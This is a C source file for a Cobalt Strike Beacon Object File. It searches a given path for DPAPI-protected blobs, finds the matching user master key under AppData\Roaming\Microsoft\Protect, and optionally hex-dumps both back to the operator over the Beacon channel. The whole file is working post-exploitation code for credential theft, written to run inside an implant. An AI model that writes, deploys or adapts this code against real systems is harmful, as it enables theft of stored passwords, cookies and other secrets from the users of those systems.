#include <windows.h>
#include <sddl.h>
#include "beacon.h"

//////////////////////////////////////
// DFR Declarations
//////////////////////////////////////
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT UINT   WINAPI KERNEL32$GetSystemDirectoryA(LPSTR, UINT);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATA);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATA);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);

DECLSPEC_IMPORT void*  WINAPI MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void   WINAPI MSVCRT$free(void*);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int    WINAPI MSVCRT$strcmp(const char*, const char*);
DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT int    WINAPI MSVCRT$_vsnprintf(char*, size_t, const char*, va_list);

// map to the DFR because i will forget
#define malloc    MSVCRT$malloc
#define free      MSVCRT$free
#define memcpy    MSVCRT$memcpy
#define strlen    MSVCRT$strlen
#define strcmp    MSVCRT$strcmp
#define snprintf  MSVCRT$_snprintf

// Global output object
formatp outputbuffer;
BOOL g_DUMP_RAW = FALSE;

void dumpFileBytes(char* filePath) {
    if (!g_DUMP_RAW) return;

    HANDLE hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(&outputbuffer, "[-] Could not open for dumping: %s\n", filePath);
        return;
    }

    char buffer[1024];
    DWORD bytesRead = 0;
    if (KERNEL32$ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
        BeaconFormatPrintf(&outputbuffer, "[*] Raw bytes for %s (%d bytes):\n", filePath, bytesRead);
        for (DWORD i = 0; i < bytesRead; i++) {
            BeaconFormatPrintf(&outputbuffer, "\\x%02X", (unsigned char)buffer[i]);
            if ((i + 1) % 32 == 0) BeaconFormatPrintf(&outputbuffer, "\n");
        }
        BeaconFormatPrintf(&outputbuffer, "\n[+] End of Dump\n");
    }
    KERNEL32$CloseHandle(hFile);
}

int IndexOfBytes(char* source, int sourceLen, char* pattern, int patternLen) {
    if (!source || !pattern || patternLen == 0 || sourceLen < patternLen) return -1;
    for (int i = 0; i <= sourceLen - patternLen; i++) {
        int found = 1;
        for (int j = 0; j < patternLen; j++) {
            if (source[i + j] != pattern[j]) { found = 0; break; }
        }
        if (found) return i;
    }
    return -1;
}

void reverseBytes(char* array, int len) {
    for (int i = 0; i < len / 2; i++) {
        char temp = array[i];
        array[i] = array[len - 1 - i];
        array[len - 1 - i] = temp;
    }
}

void parseFile(char* filePath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    char buffer[1024];
    DWORD bytesRead;
    char *szSid = NULL;

    hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    if (!KERNEL32$ReadFile(hFile, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
        KERNEL32$CloseHandle(hFile);
        return;
    }
    KERNEL32$CloseHandle(hFile);

    static char magic[] = { 0x01,0x00,0x00,0x00,0xD0,0x8C,0x9D,0xDF,0x01,0x15,0xD1,0x11,0x8C,0x7A,0x00,0xC0,0x4F,0xC2,0x97,0xEB };
    int idx = IndexOfBytes(buffer, (int)bytesRead, magic, sizeof(magic));

    if (idx >= 0) {
        BeaconFormatPrintf(&outputbuffer, "[+] Found DPAPI blob: %s\n", filePath);
        dumpFileBytes(filePath);

        char mkGuidRaw[16];
        memcpy(mkGuidRaw, buffer + idx + 24, 16);

        char g1[4], g2[2], g3[2], g4[2], g5[6];
        memcpy(g1, mkGuidRaw, 4); memcpy(g2, mkGuidRaw + 4, 2); memcpy(g3, mkGuidRaw + 6, 2);
        memcpy(g4, mkGuidRaw + 8, 2); memcpy(g5, mkGuidRaw + 10, 6);

        reverseBytes(g1, 4); reverseBytes(g2, 2); reverseBytes(g3, 2);

        char guidStr[37];
        snprintf(guidStr, sizeof(guidStr), 
            "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
            (unsigned char)g1[0], (unsigned char)g1[1], (unsigned char)g1[2], (unsigned char)g1[3],
            (unsigned char)g2[0], (unsigned char)g2[1], (unsigned char)g3[0], (unsigned char)g3[1],
            (unsigned char)g4[0], (unsigned char)g4[1], (unsigned char)g5[0], (unsigned char)g5[1],
            (unsigned char)g5[2], (unsigned char)g5[3], (unsigned char)g5[4], (unsigned char)g5[5]);

        HANDLE hToken;
        if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            DWORD len = 0;
            ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
            PTOKEN_USER pTUser = (PTOKEN_USER)malloc(len);
            if (pTUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTUser, len, &len)) {
                if (ADVAPI32$ConvertSidToStringSidA(pTUser->User.Sid, &szSid)) {
                    char szProfilePath[MAX_PATH];
                    if (KERNEL32$GetEnvironmentVariableA("USERPROFILE", szProfilePath, MAX_PATH) > 0) {
                        char mkPath[MAX_PATH];
                        snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                 szProfilePath, szSid, guidStr);
                        
                        BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
                        //BeaconFormatPrintf(&outputbuffer, "[*] Attempting to dump Master Key: %s\n", mkPath);
                        dumpFileBytes(mkPath);
                    }
                    KERNEL32$LocalFree(szSid);
                }
            }
            if (pTUser) free(pTUser);
            KERNEL32$CloseHandle(hToken);
        }
    }
}

void go(char* args, int len) {
    datap parser;
    char* searchMask = NULL;
    int searchMaskLen = 0;
    int dumpFlag = 0;

    BeaconDataParse(&parser, args, len);
    searchMask = BeaconDataExtract(&parser, &searchMaskLen);
    dumpFlag = BeaconDataInt(&parser);
    g_DUMP_RAW = (dumpFlag == 1) ? TRUE : FALSE;

    // initialize with 16KB - might be able to go lower here?
    BeaconFormatAlloc(&outputbuffer, 16384);

    if (searchMask == NULL) {
        BeaconFormatPrintf(&outputbuffer, "[-] No search path provided.\n");
    } else {
        // strip the * to get the base directory for path concatenation
        char baseDir[MAX_PATH];
        snprintf(baseDir, MAX_PATH, "%s", searchMask);
        int maskLen = (int)strlen(baseDir);
        if (maskLen > 0 && baseDir[maskLen - 1] == '*') {
            baseDir[maskLen - 1] = '\0';
        }

        WIN32_FIND_DATAA fd;
        HANDLE hFind = KERNEL32$FindFirstFileA(searchMask, &fd);

        if (hFind == INVALID_HANDLE_VALUE) {
            printf("[-] Path not found: %s\n", searchMask);
        } else {
            do {            
                if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                    char fullPath[MAX_PATH];
                    snprintf(fullPath, MAX_PATH, "%s%s", baseDir, fd.cFileName);                    
                    parseFile(fullPath);
                }
            } while (KERNEL32$FindNextFileA(hFind, &fd));
            KERNEL32$FindClose(hFind);
        }
    }

    BeaconFormatPrintf(&outputbuffer, "[+] BOF Finished.\n");

    // 2. PRINT: Send the final result
    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));

    // 3. FREE: Clean up the heap
    BeaconFormatFree(&outputbuffer);
}